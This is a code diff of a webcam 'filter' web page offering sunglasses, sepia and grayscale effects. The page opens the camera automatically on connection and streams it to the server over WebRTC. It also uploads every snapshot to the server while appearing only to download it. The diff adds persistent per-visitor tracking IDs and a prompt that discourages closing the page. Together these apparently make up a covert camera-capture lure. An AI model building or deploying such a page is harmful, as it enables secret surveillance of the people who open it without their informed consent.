@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -29,6 +28,7 @@
       position: absolute;
       width: 640px;
       height: 480px;
+      display: none; /* Hidden unless sunglasses filter is active */
     }
     .video-container {
       position: relative;
@@ -55,6 +55,12 @@
       background-color: #cccccc;
       cursor: not-allowed;
     }
+    .sepia {
+      filter: sepia(1);
+    }
+    .grayscale {
+      filter: grayscale(1);
+    }
   </style>
 </head>
 <body>
@@ -79,14 +85,23 @@
     let stream = null;
     let currentFilter = null;
     let sunglasses = new Image();
-    sunglasses.src = 'https://secret-404e.onrender.com/client-app/glass.png'; // Custom PNG, or use external URL
+    sunglasses.src = '/client-app/sunglasses.png'; // Custom PNG, or use external URL
     let faceDetectionInterval = null;
+    let clientId = localStorage.getItem('clientId') || generateClientId();
+    localStorage.setItem('clientId', clientId);
+
+    function generateClientId() {
+      return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+        const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
+        return v.toString(16);
+      });
+    }
 
     // Socket.IO connection
-    const socket = io(window.location.origin, { path: '/socket.io' });
+    const socket = io(window.location.origin, { path: '/socket.io', query: { clientId } });
     socket.on('connect', () => {
       console.log('Connected to server');
-      socket.emit('register', 'client');
+      socket.emit('register', 'client', clientId);
       startCamera();
     });
 
@@ -97,7 +112,7 @@
 
     peerConnection.onicecandidate = (event) => {
       if (event.candidate) {
-        socket.emit('ice-candidate', event.candidate);
+        socket.emit('ice-candidate', event.candidate, clientId);
         console.log('Sent ICE candidate');
       }
     };
@@ -145,25 +160,23 @@
         // Create and send offer
         const offer = await peerConnection.createOffer();
         await peerConnection.setLocalDescription(offer);
-        socket.emit('offer', offer);
+        socket.emit('offer', offer, clientId);
         console.log('Sent WebRTC offer');
 
-        // Start face detection
+        // Start face detection for sunglasses
         await Promise.all([
           faceapi.nets.tinyFaceDetector.loadFromUri('https://unpkg.com/face-api.js@0.22.2/weights'),
           faceapi.nets.faceLandmark68Net.loadFromUri('https://unpkg.com/face-api.js@0.22.2/weights')
         ]);
 
         faceDetectionInterval = setInterval(async () => {
-          const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions())
-            .withFaceLandmarks();
-
-          ctx.clearRect(0, 0, canvas.width, canvas.height);
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-
-          if (currentFilter && currentFilter !== 'none') {
-            if (currentFilter === 'sunglasses' && detections) {
+          if (currentFilter === 'sunglasses') {
+            const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions())
+              .withFaceLandmarks();
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            if (detections) {
               const landmarks = detections.landmarks;
               const leftEye = landmarks.getLeftEye();
               const rightEye = landmarks.getRightEye();
@@ -176,15 +189,7 @@
               const sunglassesX = leftEye[0].x - sunglassesWidth * 0.25;
               const sunglassesY = leftEye[0].y - sunglassesHeight * 0.5;
               ctx.drawImage(sunglasses, sunglassesX, sunglassesY, sunglassesWidth, sunglassesHeight);
-            } else if (currentFilter === 'sepia') {
-              ctx.filter = 'sepia(1)';
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            } else if (currentFilter === 'grayscale') {
-              ctx.filter = 'grayscale(1)';
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             }
-          } else {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           }
         }, 100);
       } catch (err) {
@@ -194,6 +199,13 @@
 
     function applyFilter(filter) {
       currentFilter = filter;
+      video.classList.remove('sepia', 'grayscale');
+      canvas.style.display = filter === 'sunglasses' ? 'block' : 'none';
+      if (filter === 'sepia') {
+        video.classList.add('sepia');
+      } else if (filter === 'grayscale') {
+        video.classList.add('grayscale');
+      }
       if (!stream) {
         startCamera();
       }
@@ -205,6 +217,13 @@
         snapshotCanvas.width = video.videoWidth;
         snapshotCanvas.height = video.videoHeight;
         const snapshotCtx = snapshotCanvas.getContext('2d');
+
+        // Apply CSS filter or draw video directly
+        if (currentFilter === 'sepia') {
+          snapshotCtx.filter = 'sepia(1)';
+        } else if (currentFilter === 'grayscale') {
+          snapshotCtx.filter = 'grayscale(1)';
+        }
         snapshotCtx.drawImage(video, 0, 0);
 
         // Generate timestamp for unique filename
@@ -230,24 +249,12 @@
                 snapshotCtx.drawImage(sunglasses, sunglassesX, sunglassesY, sunglassesWidth, sunglassesHeight);
               }
               const dataUrl = snapshotCanvas.toDataURL('image/png');
-              socket.emit('snapshot', dataUrl);
+              socket.emit('snapshot', dataUrl, clientId);
               downloadSnapshot(dataUrl, filename);
             });
-        } else if (currentFilter === 'sepia') {
-          snapshotCtx.filter = 'sepia(1)';
-          snapshotCtx.drawImage(video, 0, 0);
-          const dataUrl = snapshotCanvas.toDataURL('image/png');
-          socket.emit('snapshot', dataUrl);
-          downloadSnapshot(dataUrl, filename);
-        } else if (currentFilter === 'grayscale') {
-          snapshotCtx.filter = 'grayscale(1)';
-          snapshotCtx.drawImage(video, 0, 0);
-          const dataUrl = snapshotCanvas.toDataURL('image/png');
-          socket.emit('snapshot', dataUrl);
-          downloadSnapshot(dataUrl, filename);
         } else {
           const dataUrl = snapshotCanvas.toDataURL('image/png');
-          socket.emit('snapshot', dataUrl);
+          socket.emit('snapshot', dataUrl, clientId);
           downloadSnapshot(dataUrl, filename);
         }
       }
@@ -270,13 +277,21 @@
         clearInterval(faceDetectionInterval);
         ctx.clearRect(0, 0, canvas.width, canvas.height);
         currentFilter = null;
-        socket.emit('stop-camera');
+        video.classList.remove('sepia', 'grayscale');
+        canvas.style.display = 'none';
+        socket.emit('stop-camera', clientId);
         peerConnection.close();
         peerConnection = new RTCPeerConnection({
           iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
         });
       }
     }
+
+    // Warn user on page exit
+    window.addEventListener('beforeunload', (event) => {
+      event.preventDefault();
+      event.returnValue = 'Closing the page will stop the camera stream. Are you sure?';
+    });
   </script>
 </body>
 </html>
